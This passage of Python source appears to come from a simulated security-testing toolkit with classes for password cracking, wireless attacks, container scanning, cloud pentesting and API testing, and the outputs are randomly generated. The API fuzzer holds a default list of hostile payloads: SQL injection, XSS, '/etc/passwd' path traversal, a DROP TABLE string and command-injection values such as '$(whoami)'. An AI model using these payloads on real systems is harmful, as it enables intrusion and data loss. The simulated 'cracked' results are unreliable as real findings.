            'hash': hash_info.get('hash'),
            'type': hash_type,
            'username': hash_info.get('username'),
            'source': hash_info.get('source'),
            'status': 'queued',
            'cracked_value': None,
            'attempts': 0,
            'added': datetime.now().isoformat()
        })
        
        return hash_id
    
    def _identify_hash_type(self, hash_value: str) -> str:
        """Identify hash type from value."""
        length = len(hash_value)
        
        if length == 32 and all(c in '0123456789abcdef' for c in hash_value.lower()):
            return 'md5'
        elif length == 40:
            return 'sha1'
        elif length == 64:
            return 'sha256'
        elif length == 128:
            return 'sha512'
        elif hash_value.startswith('$2'):
            return 'bcrypt'
        elif hash_value.startswith('$argon2'):
            return 'argon2'
        
        return 'unknown'
    
    def simulate_crack(self, hash_id: str, mode: str = 'hybrid') -> Dict[str, Any]:
        """Simulate password cracking."""
        hash_entry = next((h for h in self.hash_queue if h['id'] == hash_id), None)
        if not hash_entry:
            return {'error': 'Hash not found'}
        
        mode_info = self.ATTACK_MODES.get(mode, self.ATTACK_MODES['dictionary'])
        hash_type_info = self.HASH_TYPES.get(hash_entry['type'], {'security': 'unknown'})
        
        # Simulate cracking based on hash security and mode effectiveness
        security_factors = {'weak': 0.8, 'medium': 0.5, 'strong': 0.2, 'very_strong': 0.05}
        effectiveness_factors = {'low': 0.5, 'medium': 0.7, 'high': 0.9}
        
        security = security_factors.get(hash_type_info.get('security', 'medium'), 0.5)
        effectiveness = effectiveness_factors.get(mode_info.get('effectiveness', 'medium'), 0.7)
        
        success_chance = security * effectiveness
        
        result = {
            'hash_id': hash_id,
            'mode': mode,
            'hash_type': hash_entry['type'],
            'timestamp': datetime.now().isoformat()
        }
        
        self.statistics['total_attempts'] += 1
        
        if random.random() < success_chance:
            # Simulate cracked password
            cracked_pw = self._generate_fake_password()
            hash_entry['cracked_value'] = cracked_pw
            hash_entry['status'] = 'cracked'
            self.cracked[hash_id] = cracked_pw
            self.statistics['successful'] += 1
            
            result['success'] = True
            result['password'] = cracked_pw
            result['attempts'] = random.randint(1000, 10000000)
            result['time_seconds'] = random.uniform(0.1, 3600)
        else:
            hash_entry['status'] = 'failed'
            self.statistics['failed'] += 1
            result['success'] = False
            result['reason'] = 'Password not in keyspace'
        
        return result
    
    def _generate_fake_password(self) -> str:
        """Generate realistic-looking cracked password."""
        templates = [
            'Password123', 'Summer2023!', 'Welcome1', 'Admin@123',
            'Company2024', 'P@ssw0rd', 'Qwerty123!', 'Winter2024',
            'Baseball1', 'Football22', 'Dragon123', 'Master1!'
        ]
        return random.choice(templates)
    
    def analyze_password(self, password: str) -> Dict[str, Any]:
        """Analyze password strength and patterns."""
        analysis = {
            'password': password,
            'length': len(password),
            'strength': 'weak',
            'score': 0,
            'patterns_found': [],
            'suggestions': []
        }
        
        # Length scoring
        if len(password) >= 16:
            analysis['score'] += 30
        elif len(password) >= 12:
            analysis['score'] += 20
        elif len(password) >= 8:
            analysis['score'] += 10
        
        # Character variety
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password)
        
        variety_count = sum([has_lower, has_upper, has_digit, has_special])
        analysis['score'] += variety_count * 15
        
        # Pattern detection
        for pattern in self.COMMON_PATTERNS:
            if re.match(pattern, password):
                analysis['patterns_found'].append(pattern)
                analysis['score'] -= 10
        
        # Common word check (simplified)
        common_words = ['password', 'admin', 'user', 'login', 'welcome', 'test']
        for word in common_words:
            if word in password.lower():
                analysis['patterns_found'].append(f'Contains "{word}"')
                analysis['score'] -= 20
        
        # Determine strength
        if analysis['score'] >= 70:
            analysis['strength'] = 'strong'
        elif analysis['score'] >= 50:
            analysis['strength'] = 'medium'
        else:
            analysis['strength'] = 'weak'
        
        # Suggestions
        if not has_special:
            analysis['suggestions'].append('Add special characters')
        if not has_upper:
            analysis['suggestions'].append('Add uppercase letters')
        if len(password) < 12:
            analysis['suggestions'].append('Increase length to 12+')
        
        return analysis
    
    def generate_cracking_report(self) -> str:
        """Generate password cracking report."""
        lines = [
            "=" * 70,
            "üîì PASSWORD CRACKING ENGINE REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Hashes in Queue: {len(self.hash_queue)}",
            f"‚úÖ Successfully Cracked: {self.statistics['successful']}",
            f"‚ùå Failed: {self.statistics['failed']}",
            ""
        ]
        
        # Attack modes
        lines.extend([
            "‚öîÔ∏è ATTACK MODES",
            "‚îÄ" * 40
        ])
        
        for mode_id, mode_info in self.ATTACK_MODES.items():
            speed_icon = {'instant': '‚ö°', 'fast': 'üöÄ', 'medium': 'üöó', 'slow': 'üê¢', 'very_slow': 'üêå'}.get(mode_info['speed'], '‚û°Ô∏è')
            lines.append(f"   {speed_icon} {mode_info['name']}")
            lines.append(f"      {mode_info['description']}")
        lines.append("")
        
        # Hash types
        lines.extend([
            "üîê SUPPORTED HASH TYPES",
            "‚îÄ" * 40
        ])
        
        for hash_id, hash_info in self.HASH_TYPES.items():
            sec_icon = {'weak': 'üî¥', 'medium': 'üü°', 'strong': 'üü¢', 'very_strong': 'üíé'}.get(hash_info['security'], '‚ö™')
            lines.append(f"   {sec_icon} {hash_info['name']} ({hash_info['security']})")
        lines.append("")
        
        # Cracked hashes
        if self.cracked:
            lines.extend([
                "üèÜ CRACKED PASSWORDS",
                "‚îÄ" * 40
            ])
            for hash_id, password in list(self.cracked.items())[:10]:
                hash_entry = next((h for h in self.hash_queue if h['id'] == hash_id), {})
                lines.append(f"   ‚úÖ {hash_entry.get('username', 'Unknown')}: {password}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class WirelessAttackSimulator:
    """Simulate wireless network attacks."""
    
    ATTACK_TYPES = {
        'deauth': {
            'name': 'Deauthentication Attack',
            'description': 'Disconnect clients from AP',
            'tools': ['aireplay-ng', 'mdk4'],
            'category': 'dos'
        },
        'evil_twin': {
            'name': 'Evil Twin',
            'description': 'Rogue access point impersonation',
            'tools': ['hostapd', 'airbase-ng'],
            'category': 'mitm'
        },
        'handshake_capture': {
            'name': 'Handshake Capture',
            'description': 'Capture WPA/WPA2 handshake',
            'tools': ['airodump-ng', 'tcpdump'],
            'category': 'capture'
        },
        'pmkid': {
            'name': 'PMKID Attack',
            'description': 'Capture PMKID without client',
            'tools': ['hcxdumptool', 'hcxtools'],
            'category': 'capture'
        },
        'karma': {
            'name': 'KARMA Attack',
            'description': 'Respond to probe requests',
            'tools': ['hostapd-mana', 'eaphammer'],
            'category': 'mitm'
        },
        'krack': {
            'name': 'KRACK Attack',
            'description': 'Key reinstallation attack',
            'tools': ['krackattacks-scripts'],
            'category': 'exploit'
        },
        'wps_attack': {
            'name': 'WPS Pin Attack',
            'description': 'Brute force WPS PIN',
            'tools': ['reaver', 'bully'],
            'category': 'crack'
        },
        'pixie_dust': {
            'name': 'Pixie Dust',
            'description': 'Offline WPS attack',
            'tools': ['reaver', 'pixiewps'],
            'category': 'crack'
        },
        'beacon_flood': {
            'name': 'Beacon Flood',
            'description': 'Create fake access points',
            'tools': ['mdk4', 'airbase-ng'],
            'category': 'dos'
        }
    }
    
    ENCRYPTION_TYPES = {
        'open': {'security': 0, 'crackable': True},
        'wep': {'security': 1, 'crackable': True},
        'wpa': {'security': 2, 'crackable': True},
        'wpa2_personal': {'security': 3, 'crackable': True},
        'wpa2_enterprise': {'security': 4, 'crackable': False},
        'wpa3': {'security': 5, 'crackable': False}
    }
    
    def __init__(self):
        self.networks = []
        self.clients = []
        self.handshakes = []
        self.attacks = []
    
    def discover_network(self, network_info: Dict[str, Any]) -> str:
        """Add discovered wireless network."""
        network_id = str(uuid.uuid4())[:8]
        
        self.networks.append({
            'id': network_id,
            'bssid': network_info.get('bssid'),
            'essid': network_info.get('essid'),
            'channel': network_info.get('channel', 1),
            'encryption': network_info.get('encryption', 'wpa2_personal'),
            'cipher': network_info.get('cipher', 'CCMP'),
            'signal': network_info.get('signal', -60),
            'clients': [],
            'handshake_captured': False,
            'password': None,
            'discovered': datetime.now().isoformat()
        })
        
        return network_id
    
    def discover_client(self, client_info: Dict[str, Any]) -> str:
        """Add discovered wireless client."""
        client_id = str(uuid.uuid4())[:8]
        
        client = {
            'id': client_id,
            'mac': client_info.get('mac'),
            'network_id': client_info.get('network_id'),
            'signal': client_info.get('signal', -70),
            'probes': client_info.get('probes', []),
            'discovered': datetime.now().isoformat()
        }
        
        self.clients.append(client)
        
        # Link to network
        network_id = client_info.get('network_id')
        network = next((n for n in self.networks if n['id'] == network_id), None)
        if network:
            network['clients'].append(client_id)
        
        return client_id
    
    def simulate_attack(self, attack_type: str, target_network: str) -> Dict[str, Any]:
        """Simulate wireless attack."""
        attack_info = self.ATTACK_TYPES.get(attack_type)
        if not attack_info:
            return {'error': 'Unknown attack type'}
        
        network = next((n for n in self.networks if n['id'] == target_network), None)
        if not network:
            return {'error': 'Network not found'}
        
        result = {
            'attack_id': str(uuid.uuid4())[:8],
            'attack_type': attack_type,
            'target_network': network['essid'],
            'target_bssid': network['bssid'],
            'timestamp': datetime.now().isoformat(),
            'success': False
        }
        
        # Simulate based on attack type
        if attack_type == 'handshake_capture':
            if network['clients'] and random.random() < 0.8:
                result['success'] = True
                network['handshake_captured'] = True
                self.handshakes.append({
                    'network_id': target_network,
                    'captured': datetime.now().isoformat()
                })
                result['handshake'] = True
        
        elif attack_type == 'deauth':
            if network['clients']:
                result['success'] = True
                result['clients_disconnected'] = len(network['clients'])
        
        elif attack_type == 'evil_twin':
            result['success'] = True
            result['rogue_ap'] = f"fake_{network['essid']}"
        
        elif attack_type in ['wps_attack', 'pixie_dust']:
            if random.random() < 0.3:
                result['success'] = True
                result['pin'] = ''.join([str(random.randint(0,9)) for _ in range(8)])
                result['password'] = 'WiFiPassword123'
        
        self.attacks.append(result)
        return result
    
    def generate_wireless_report(self) -> str:
        """Generate wireless attack report."""
        lines = [
            "=" * 70,
            "üì° WIRELESS ATTACK SIMULATION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üì∂ Networks Discovered: {len(self.networks)}",
            f"üì± Clients Discovered: {len(self.clients)}",
            f"ü§ù Handshakes Captured: {len(self.handshakes)}",
            f"‚öîÔ∏è Attacks Performed: {len(self.attacks)}",
            ""
        ]
        
        # Attack types
        lines.extend([
            "‚öîÔ∏è ATTACK CAPABILITIES",
            "‚îÄ" * 40
        ])
        
        for attack_id, attack_info in self.ATTACK_TYPES.items():
            lines.append(f"   ‚Ä¢ {attack_info['name']}")
            lines.append(f"     {attack_info['description']}")
        lines.append("")
        
        # Discovered networks
        if self.networks:
            lines.extend([
                "üì∂ DISCOVERED NETWORKS",
                "‚îÄ" * 40
            ])
            for network in self.networks[:10]:
                enc_icon = {'open': 'üîì', 'wep': 'üî¥', 'wpa': 'üü†', 'wpa2_personal': 'üü°', 'wpa2_enterprise': 'üü¢', 'wpa3': 'üíé'}.get(network['encryption'], '‚ùì')
                lines.append(f"   {enc_icon} {network['essid']} ({network['bssid']})")
                lines.append(f"      CH: {network['channel']} | Signal: {network['signal']} dBm | Clients: {len(network['clients'])}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ContainerSecurityScanner:
    """Scan container images and configurations for security issues."""
    
    VULNERABILITY_CATEGORIES = {
        'os_packages': {
            'name': 'OS Package Vulnerabilities',
            'description': 'Vulnerabilities in operating system packages',
            'severity_weight': 1.0
        },
        'app_dependencies': {
            'name': 'Application Dependencies',
            'description': 'Vulnerabilities in application libraries',
            'severity_weight': 0.9
        },
        'misconfigurations': {
            'name': 'Container Misconfigurations',
            'description': 'Security misconfigurations in container setup',
            'severity_weight': 0.8
        },
        'secrets': {
            'name': 'Embedded Secrets',
            'description': 'Hardcoded secrets and credentials',
            'severity_weight': 1.0
        },
        'malware': {
            'name': 'Malware Detection',
            'description': 'Known malicious files or behaviors',
            'severity_weight': 1.0
        }
    }
    
    BEST_PRACTICES = [
        {'id': 'non_root', 'name': 'Run as non-root user', 'severity': 'high'},
        {'id': 'no_secrets', 'name': 'No hardcoded secrets', 'severity': 'critical'},
        {'id': 'minimal_base', 'name': 'Use minimal base image', 'severity': 'medium'},
        {'id': 'specific_version', 'name': 'Use specific image versions', 'severity': 'medium'},
        {'id': 'healthcheck', 'name': 'Define health checks', 'severity': 'low'},
        {'id': 'readonly_fs', 'name': 'Use read-only filesystem', 'severity': 'medium'},
        {'id': 'drop_capabilities', 'name': 'Drop unnecessary capabilities', 'severity': 'high'},
        {'id': 'no_privileged', 'name': 'Avoid privileged mode', 'severity': 'critical'},
        {'id': 'limit_resources', 'name': 'Set resource limits', 'severity': 'medium'},
        {'id': 'scan_regularly', 'name': 'Regular vulnerability scanning', 'severity': 'high'}
    ]
    
    def __init__(self):
        self.scanned_images = []
        self.findings = []
        self.compliance_results = []
    
    def scan_image(self, image_info: Dict[str, Any]) -> Dict[str, Any]:
        """Scan container image for vulnerabilities."""
        scan_id = str(uuid.uuid4())[:8]
        
        # Simulate scan results
        vulnerabilities = self._generate_vulnerabilities(image_info)
        misconfigs = self._check_misconfigurations(image_info)
        secrets = self._check_secrets(image_info)
        
        result = {
            'scan_id': scan_id,
            'image': image_info.get('name'),
            'tag': image_info.get('tag', 'latest'),
            'registry': image_info.get('registry'),
            'scan_time': datetime.now().isoformat(),
            'layers': random.randint(5, 25),
            'size_mb': random.randint(50, 2000),
            'vulnerabilities': vulnerabilities,
            'misconfigurations': misconfigs,
            'secrets_found': secrets,
            'risk_score': 0,
            'compliant': True
        }
        
        # Calculate risk score
        vuln_score = sum(
            {'critical': 40, 'high': 25, 'medium': 10, 'low': 2}.get(v['severity'], 0) 
            for v in vulnerabilities
        )
        misconfig_score = sum(
            {'critical': 30, 'high': 20, 'medium': 10, 'low': 5}.get(m['severity'], 0)
            for m in misconfigs
        )
        secret_score = len(secrets) * 30
        
        result['risk_score'] = min(100, vuln_score + misconfig_score + secret_score)
        result['compliant'] = result['risk_score'] < 30
        
        self.scanned_images.append(result)
        return result
    
    def _generate_vulnerabilities(self, image_info: Dict) -> List[Dict[str, Any]]:
        """Generate simulated vulnerabilities."""
        vulnerabilities = []
        
        # Generate random vulnerabilities
        vuln_count = random.randint(0, 50)
        
        for _ in range(vuln_count):
            severity = random.choices(
                ['critical', 'high', 'medium', 'low'],
                weights=[5, 15, 40, 40]
            )[0]
            
            vulnerabilities.append({
                'id': f'CVE-{random.randint(2018, 2024)}-{random.randint(1000, 99999)}',
                'package': random.choice(['openssl', 'curl', 'glibc', 'bash', 'nginx', 'python', 'node']),
                'severity': severity,
                'cvss': round(random.uniform(1.0, 10.0), 1),
                'fixed_version': f'{random.randint(1,5)}.{random.randint(0,20)}.{random.randint(0,100)}',
                'description': 'Simulated vulnerability description'
            })
        
        return vulnerabilities
    
    def _check_misconfigurations(self, image_info: Dict) -> List[Dict[str, Any]]:
        """Check for container misconfigurations."""
        misconfigs = []
        
        # Check against best practices
        for practice in self.BEST_PRACTICES:
            if random.random() < 0.3:  # 30% chance of failing each check
                misconfigs.append({
                    'check_id': practice['id'],
                    'name': practice['name'],
                    'severity': practice['severity'],
                    'remediation': f'Implement: {practice["name"]}'
                })
        
        return misconfigs
    
    def _check_secrets(self, image_info: Dict) -> List[Dict[str, Any]]:
        """Check for embedded secrets."""
        secrets = []
        
        secret_types = ['api_key', 'password', 'private_key', 'aws_key', 'database_url']
        
        for _ in range(random.randint(0, 5)):
            secrets.append({
                'type': random.choice(secret_types),
                'path': f'/app/config/{random.choice(["env", "secrets", "config"])}.{random.choice(["json", "yaml", "env"])}',
                'severity': 'critical'
            })
        
        return secrets
    
    def generate_container_report(self) -> str:
        """Generate container security report."""
        lines = [
            "=" * 70,
            "üê≥ CONTAINER SECURITY SCAN REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üì¶ Images Scanned: {len(self.scanned_images)}",
            ""
        ]
        
        # Best practices reference
        lines.extend([
            "üìã SECURITY BEST PRACTICES",
            "‚îÄ" * 40
        ])
        
        for practice in self.BEST_PRACTICES[:8]:
            sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(practice['severity'], '‚ö™')
            lines.append(f"   {sev_icon} {practice['name']}")
        lines.append("")
        
        # Scan results
        for scan in self.scanned_images:
            vuln_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
            for v in scan['vulnerabilities']:
                vuln_counts[v['severity']] = vuln_counts.get(v['severity'], 0) + 1
            
            compliance_icon = "‚úÖ" if scan['compliant'] else "‚ùå"
            
            lines.extend([
                f"üì¶ IMAGE: {scan['image']}:{scan['tag']}",
                "‚îÄ" * 40,
                f"   {compliance_icon} Compliance: {'PASSED' if scan['compliant'] else 'FAILED'}",
                f"   üìä Risk Score: {scan['risk_score']}/100",
                f"   üî¥ Critical: {vuln_counts['critical']} | üü† High: {vuln_counts['high']}",
                f"   üü° Medium: {vuln_counts['medium']} | üü¢ Low: {vuln_counts['low']}",
                f"   ‚ö†Ô∏è Misconfigs: {len(scan['misconfigurations'])}",
                f"   üîë Secrets: {len(scan['secrets_found'])}",
                ""
            ])
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class CloudPentestingToolkit:
    """Cloud infrastructure penetration testing toolkit."""
    
    CLOUD_PROVIDERS = {
        'aws': {
            'name': 'Amazon Web Services',
            'icon': '‚òÅÔ∏è',
            'services': ['EC2', 'S3', 'Lambda', 'IAM', 'RDS', 'DynamoDB', 'EKS', 'CloudTrail']
        },
        'azure': {
            'name': 'Microsoft Azure',
            'icon': 'üî∑',
            'services': ['VMs', 'Blob Storage', 'Functions', 'AAD', 'SQL', 'AKS', 'Key Vault']
        },
        'gcp': {
            'name': 'Google Cloud Platform',
            'icon': 'üî¥',
            'services': ['Compute', 'Storage', 'Cloud Functions', 'IAM', 'BigQuery', 'GKE']
        }
    }
    
    ATTACK_SCENARIOS = {
        'credential_exposure': {
            'name': 'Credential Exposure',
            'description': 'Find exposed API keys and credentials',
            'severity': 'critical',
            'mitre_id': 'T1552'
        },
        'misconfig_s3': {
            'name': 'S3 Bucket Misconfiguration',
            'description': 'Public buckets with sensitive data',
            'severity': 'high',
            'mitre_id': 'T1530'
        },
        'ssrf': {
            'name': 'SSRF to Metadata',
            'description': 'Access cloud metadata via SSRF',
            'severity': 'critical',
            'mitre_id': 'T1552.005'
        },
        'privilege_escalation': {
            'name': 'IAM Privilege Escalation',
            'description': 'Escalate IAM permissions',
            'severity': 'critical',
            'mitre_id': 'T1078.004'
        },
        'lambda_injection': {
            'name': 'Lambda Code Injection',
            'description': 'Inject code into serverless functions',
            'severity': 'high',
            'mitre_id': 'T1059'
        },
        'container_escape': {
            'name': 'Container Escape',
            'description': 'Break out of container to host',
            'severity': 'critical',
            'mitre_id': 'T1611'
        },
        'persistence': {
            'name': 'Cloud Persistence',
            'description': 'Establish persistence in cloud environment',
            'severity': 'high',
            'mitre_id': 'T1098'
        }
    }
    
    def __init__(self):
        self.discovered_resources = []
        self.findings = []
        self.credentials = []
        self.attack_paths = []
    
    def enumerate_resources(self, provider: str, credentials: Dict[str, Any]) -> Dict[str, Any]:
        """Enumerate cloud resources."""
        provider_info = self.CLOUD_PROVIDERS.get(provider)
        if not provider_info:
            return {'error': 'Unknown provider'}
        
        result = {
            'provider': provider,
            'enumeration_id': str(uuid.uuid4())[:8],
            'timestamp': datetime.now().isoformat(),
            'resources': {}
        }
        
        # Simulate resource discovery
        for service in provider_info['services']:
            count = random.randint(0, 20)
            if count > 0:
                result['resources'][service] = {
                    'count': count,
                    'items': [f'{service.lower()}-{i}' for i in range(min(count, 5))]
                }
        
        self.discovered_resources.append(result)
        return result
    
    def check_misconfigurations(self, provider: str, resource_type: str) -> List[Dict[str, Any]]:
        """Check for cloud misconfigurations."""
        findings = []
        
        misconfig_checks = {
            'S3': ['public_access', 'no_encryption', 'no_versioning', 'no_logging'],
            'EC2': ['public_ip', 'open_security_groups', 'no_imdsv2', 'default_vpc'],
            'IAM': ['overly_permissive', 'unused_credentials', 'no_mfa', 'access_keys'],
            'Lambda': ['public_invoke', 'env_secrets', 'excessive_permissions'],
            'RDS': ['public_access', 'no_encryption', 'default_passwords']
        }
        
        checks = misconfig_checks.get(resource_type, ['general_check'])
        
        for check in checks:
            if random.random() < 0.4:  # 40% chance of finding issue
                findings.append({
                    'id': str(uuid.uuid4())[:8],
                    'check': check,
                    'resource_type': resource_type,
                    'provider': provider,
                    'severity': random.choice(['critical', 'high', 'medium', 'low']),
                    'description': f'Misconfiguration found: {check.replace("_", " ")}',
                    'remediation': f'Fix the {check.replace("_", " ")} issue'
                })
        
        self.findings.extend(findings)
        return findings
    
    def simulate_attack(self, scenario_id: str, target: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate cloud attack scenario."""
        scenario = self.ATTACK_SCENARIOS.get(scenario_id)
        if not scenario:
            return {'error': 'Unknown scenario'}
        
        result = {
            'attack_id': str(uuid.uuid4())[:8],
            'scenario': scenario_id,
            'name': scenario['name'],
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'success': random.random() < 0.6,
            'steps': [],
            'findings': []
        }
        
        # Generate attack steps
        result['steps'] = [
            {'step': 1, 'action': 'Initial reconnaissance', 'status': 'completed'},
            {'step': 2, 'action': f'Execute {scenario["name"]}', 'status': 'completed' if result['success'] else 'failed'},
            {'step': 3, 'action': 'Validate access', 'status': 'completed' if result['success'] else 'skipped'}
        ]
        
        if result['success']:
            result['findings'].append({
                'severity': scenario['severity'],
                'mitre_id': scenario['mitre_id'],
                'description': scenario['description'],
                'impact': 'Potential data access or further compromise'
            })
        
        self.attack_paths.append(result)
        return result
    
    def generate_cloud_report(self) -> str:
        """Generate cloud pentesting report."""
        lines = [
            "=" * 70,
            "‚òÅÔ∏è CLOUD PENETRATION TESTING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üîç Resources Discovered: {sum(len(r['resources']) for r in self.discovered_resources)}",
            f"‚ö†Ô∏è Findings: {len(self.findings)}",
            f"‚öîÔ∏è Attack Paths: {len(self.attack_paths)}",
            ""
        ]
        
        # Cloud providers
        lines.extend([
            "‚òÅÔ∏è SUPPORTED CLOUD PROVIDERS",
            "‚îÄ" * 40
        ])
        
        for provider_id, provider_info in self.CLOUD_PROVIDERS.items():
            lines.append(f"   {provider_info['icon']} {provider_info['name']}")
            lines.append(f"      Services: {', '.join(provider_info['services'][:5])}")
        lines.append("")
        
        # Attack scenarios
        lines.extend([
            "‚öîÔ∏è ATTACK SCENARIOS",
            "‚îÄ" * 40
        ])
        
        for scenario_id, scenario_info in self.ATTACK_SCENARIOS.items():
            sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(scenario_info['severity'], '‚ö™')
            lines.append(f"   {sev_icon} {scenario_info['name']} ({scenario_info['mitre_id']})")
        lines.append("")
        
        # Findings summary
        if self.findings:
            lines.extend([
                "üîç FINDINGS SUMMARY",
                "‚îÄ" * 40
            ])
            
            sev_counts = {}
            for finding in self.findings:
                sev = finding['severity']
                sev_counts[sev] = sev_counts.get(sev, 0) + 1
            
            for sev in ['critical', 'high', 'medium', 'low']:
                count = sev_counts.get(sev, 0)
                sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(sev, '‚ö™')
                lines.append(f"   {sev_icon} {sev.title()}: {count}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class APISecurityTester:
    """Comprehensive API security testing toolkit."""
    
    OWASP_API_TOP_10 = {
        'api1': {'name': 'Broken Object Level Authorization', 'tests': ['idor', 'object_access']},
        'api2': {'name': 'Broken Authentication', 'tests': ['auth_bypass', 'brute_force', 'session']},
        'api3': {'name': 'Broken Object Property Level Authorization', 'tests': ['mass_assignment', 'excessive_data']},
        'api4': {'name': 'Unrestricted Resource Consumption', 'tests': ['rate_limit', 'resource_exhaustion']},
        'api5': {'name': 'Broken Function Level Authorization', 'tests': ['priv_func', 'admin_functions']},
        'api6': {'name': 'Unrestricted Access to Sensitive Business Flows', 'tests': ['flow_abuse', 'automation']},
        'api7': {'name': 'Server Side Request Forgery', 'tests': ['ssrf', 'internal_access']},
        'api8': {'name': 'Security Misconfiguration', 'tests': ['headers', 'cors', 'verbose_errors']},
        'api9': {'name': 'Improper Inventory Management', 'tests': ['old_versions', 'debug_endpoints']},
        'api10': {'name': 'Unsafe Consumption of APIs', 'tests': ['third_party', 'data_validation']}
    }
    
    HTTP_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
    
    def __init__(self):
        self.endpoints = []
        self.findings = []
        self.test_results = []
        self.authentication = {}
    
    def add_endpoint(self, endpoint_info: Dict[str, Any]) -> str:
        """Add API endpoint for testing."""
        endpoint_id = str(uuid.uuid4())[:8]
        
        self.endpoints.append({
            'id': endpoint_id,
            'url': endpoint_info.get('url'),
            'method': endpoint_info.get('method', 'GET'),
            'parameters': endpoint_info.get('parameters', {}),
            'headers': endpoint_info.get('headers', {}),
            'auth_required': endpoint_info.get('auth', True),
            'description': endpoint_info.get('description', ''),
            'tested': False,
            'findings': []
        })
        
        return endpoint_id
    
    def test_endpoint(self, endpoint_id: str, tests: List[str] = None) -> Dict[str, Any]:
        """Run security tests on endpoint."""
        endpoint = next((e for e in self.endpoints if e['id'] == endpoint_id), None)
        if not endpoint:
            return {'error': 'Endpoint not found'}
        
        result = {
            'endpoint_id': endpoint_id,
            'url': endpoint['url'],
            'method': endpoint['method'],
            'timestamp': datetime.now().isoformat(),
            'tests_run': [],
            'vulnerabilities': []
        }
        
        # Run OWASP API Top 10 tests
        for api_id, api_info in self.OWASP_API_TOP_10.items():
            if tests and api_id not in tests:
                continue
            
            test_result = {
                'test': api_id,
                'name': api_info['name'],
                'status': 'passed',
                'details': []
            }
            
            # Simulate test execution
            for sub_test in api_info['tests']:
                if random.random() < 0.2:  # 20% chance of finding issue
                    test_result['status'] = 'failed'
                    test_result['details'].append({
                        'sub_test': sub_test,
                        'severity': random.choice(['critical', 'high', 'medium']),
                        'description': f'Vulnerability found in {sub_test.replace("_", " ")}'
                    })
                    
                    result['vulnerabilities'].append({
                        'category': api_id,
                        'test': sub_test,
                        'severity': random.choice(['critical', 'high', 'medium']),
                        'url': endpoint['url']
                    })
            
            result['tests_run'].append(test_result)
        
        endpoint['tested'] = True
        endpoint['findings'] = result['vulnerabilities']
        self.test_results.append(result)
        
        return result
    
    def fuzz_endpoint(self, endpoint_id: str, wordlist: List[str] = None) -> Dict[str, Any]:
        """Fuzz endpoint with payloads."""
        endpoint = next((e for e in self.endpoints if e['id'] == endpoint_id), None)
        if not endpoint:
            return {'error': 'Endpoint not found'}
        
        default_payloads = [
            "' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd",
            "{{7*7}}", "${7*7}", "%00", "admin'--", "1; DROP TABLE users",
            "|ls -la", "$(whoami)", "`id`"
        ]
        
        payloads = wordlist or default_payloads
        
        result = {
            'endpoint_id': endpoint_id,
            'payloads_tested': len(payloads),
            'interesting_responses': [],
            'potential_vulns': []
        }
        
        for payload in payloads:
            # Simulate response analysis
            if random.random() < 0.1:  # 10% chance of interesting response
                result['interesting_responses'].append({
                    'payload': payload,
                    'response_code': random.choice([200, 500, 403]),
                    'anomaly': random.choice(['reflection', 'error_disclosure', 'timing_anomaly'])
                })
        
        return result
    
    def generate_api_report(self) -> str:
        """Generate API security testing report."""
        lines = [
            "=" * 70,
            "üîå API SECURITY TESTING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üîó Endpoints Tested: {len([e for e in self.endpoints if e['tested']])}",
            f"üìã Total Endpoints: {len(self.endpoints)}",
            f"‚ö†Ô∏è Vulnerabilities Found: {sum(len(r['vulnerabilities']) for r in self.test_results)}",
            ""
        ]
        
        # OWASP API Top 10 reference
        lines.extend([
            "üìñ OWASP API SECURITY TOP 10",
            "‚îÄ" * 40
        ])
        
        for api_id, api_info in self.OWASP_API_TOP_10.items():
            lines.append(f"   {api_id.upper()}: {api_info['name']}")
        lines.append("")
        
        # Test results
        if self.test_results:
            lines.extend([
                "üß™ TEST RESULTS",
                "‚îÄ" * 40
            ])
            
            for result in self.test_results[-5:]:
                vuln_count = len(result['vulnerabilities'])
                status_icon = "üî¥" if vuln_count > 0 else "üü¢"
                lines.append(f"   {status_icon} {result['url']}")
                lines.append(f"      Vulnerabilities: {vuln_count}")
        
        # Vulnerability summary
        all_vulns = []
        for result in self.test_results:
            all_vulns.extend(result['vulnerabilities'])
        
        if all_vulns:
            lines.extend([
                "",
                "üîç VULNERABILITY BREAKDOWN",
                "‚îÄ" * 40
            ])
            
            cat_counts = {}
            for vuln in all_vulns:
                cat = vuln['category']
                cat_counts[cat] = cat_counts.get(cat, 0) + 1
            
            for cat, count in sorted(cat_counts.items(), key=lambda x: -x[1]):
                cat_name = self.OWASP_API_TOP_10.get(cat, {}).get('name', cat)
                lines.append(f"   ‚Ä¢ {cat.upper()}: {count} ({cat_name})")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ActiveDirectoryAssessment:
    """Active Directory security assessment toolkit."""
    
    AD_ATTACK_PATHS = {
        'kerberoasting': {
            'name': 'Kerberoasting',
            'description': 'Extract service account TGS for offline cracking',
            'mitre_id': 'T1558.003',
            'severity': 'high'
        },
        'asreproasting': {
            'name': 'AS-REP Roasting',
            'description': 'Attack accounts without pre-authentication',
